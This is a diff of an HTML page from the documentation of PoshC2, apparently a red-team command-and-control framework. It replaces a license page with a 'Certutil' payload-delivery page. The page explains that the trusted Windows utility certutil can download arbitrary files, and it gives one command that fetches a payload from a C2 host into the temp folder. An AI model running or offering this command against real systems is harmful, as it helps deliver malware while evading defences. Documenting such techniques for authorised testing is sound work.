@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>BSD 3-Clause License &mdash; PoshC2 Framework  documentation</title>
+  <title>Certutil &mdash; PoshC2 Framework  documentation</title>
   
 
   
@@ -36,8 +36,9 @@
               href="../genindex.html"/>
         <link rel="search" title="Search" href="../search.html"/>
     <link rel="top" title="PoshC2 Framework  documentation" href="../index.html"/>
-        <link rel="up" title="License" href="index.html"/>
-        <link rel="prev" title="License" href="index.html"/> 
+        <link rel="up" title="Execution / Payloads" href="index.html"/>
+        <link rel="next" title="Core Implant / Features" href="../core/index.html"/>
+        <link rel="prev" title="Mshta" href="mshta.html"/> 
 
   
   <script src="../_static/js/modernizr.min.js"></script>
@@ -88,16 +89,32 @@
             
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../execution/index.html">Execution / Payloads</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
+<li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
+<li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
+<li class="toctree-l2"><a class="reference internal" href="lnk.html">LNK File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="hta.html">HTA File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="macro.html">Macro Documents</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ms16-051.html">MS16-051 HTML File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="java.html">Java Applet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="dll.html">Reflective DLL</a></li>
+<li class="toctree-l2"><a class="reference internal" href="shellcode.html">Shellcode</a></li>
+<li class="toctree-l2"><a class="reference internal" href="poshjs.html">PoshJS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sctfiles.html">SCT Files</a></li>
+<li class="toctree-l2"><a class="reference internal" href="regsvr32.html">RegSvr32</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cscript.html">Cscript</a></li>
+<li class="toctree-l2"><a class="reference internal" href="mshta.html">Mshta</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">Certutil</a></li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="../core/index.html">Core Implant / Features</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../persistence/index.html">Persistence</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../modules/index.html">Modules</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../lateral_movement/index.html">Lateral Movement</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../reporting/index.html">Reporting</a></li>
-<li class="toctree-l1 current"><a class="reference internal" href="index.html">License</a><ul class="current">
-<li class="toctree-l2 current"><a class="current reference internal" href="#">BSD 3-Clause License</a></li>
-</ul>
-</li>
+<li class="toctree-l1"><a class="reference internal" href="../license/index.html">License</a></li>
 </ul>
 
             
@@ -142,15 +159,15 @@
     
       <li><a href="../index.html">Docs</a> &raquo;</li>
         
-          <li><a href="index.html">License</a> &raquo;</li>
+          <li><a href="index.html">Execution / Payloads</a> &raquo;</li>
         
-      <li>BSD 3-Clause License</li>
+      <li>Certutil</li>
     
     
       <li class="wy-breadcrumbs-aside">
         
             
-            <a href="../_sources/license/BSD-3-Clause.txt" rel="nofollow"> View page source</a>
+            <a href="../_sources/execution/certutil.txt" rel="nofollow"> View page source</a>
           
         
       </li>
@@ -163,32 +180,14 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
             
-  <div class="section" id="bsd-3-clause-license">
-<h1>BSD 3-Clause License<a class="headerlink" href="#bsd-3-clause-license" title="Permalink to this headline">¶</a></h1>
-<p>Copyright (c) 2016, Ben Turner (&#64;benpturner) and Dave Hardy (&#64;davehardy20)
-All rights reserved.</p>
-<p>Redistribution and use in source and binary forms, with or without
-modification, are permitted provided that the following conditions are met:</p>
-<ul class="simple">
-<li>Redistributions of source code must retain the above copyright notice, this
-list of conditions and the following disclaimer.</li>
-<li>Redistributions in binary form must reproduce the above copyright notice,
-this list of conditions and the following disclaimer in the documentation
-and/or other materials provided with the distribution.</li>
-<li>Neither the name of the copyright holder nor the names of its
-contributors may be used to endorse or promote products derived from
-this software without specific prior written permission.</li>
-</ul>
-<p>THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS”
-AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
-IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
-FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
-DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
-SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
-CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
-OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
-OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</p>
+  <div class="section" id="certutil">
+<h1>Certutil<a class="headerlink" href="#certutil" title="Permalink to this headline">¶</a></h1>
+<p>Certutil.exe is a command line utility that is installed as part of Certificate Services and is default on most Windows installations.</p>
+<p>SubTee (Casey Smith) discovered that it was possible to misuse this utility to download arbitrary files from the Internet. This utility has some benefits over other downloading tools as its a trusted binary, proxy aware and supports HTTPS.</p>
+<p>Certutil do not work with untrusted SSL certificates if using over HTTPS:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">certutil</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">c2</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">news</span><span class="o">/</span><span class="n">j9hau_iu</span> <span class="o">%</span><span class="n">temp</span><span class="o">%</span>\\<span class="n">j9hau_iu</span>
+</pre></div>
+</div>
 </div>
 
 
@@ -201,8 +200,10 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</p>
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
+        <a href="../core/index.html" class="btn btn-neutral float-right" title="Core Implant / Features" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
-        <a href="index.html" class="btn btn-neutral" title="License" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+        <a href="mshta.html" class="btn btn-neutral" title="Mshta" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
       
     </div>
   
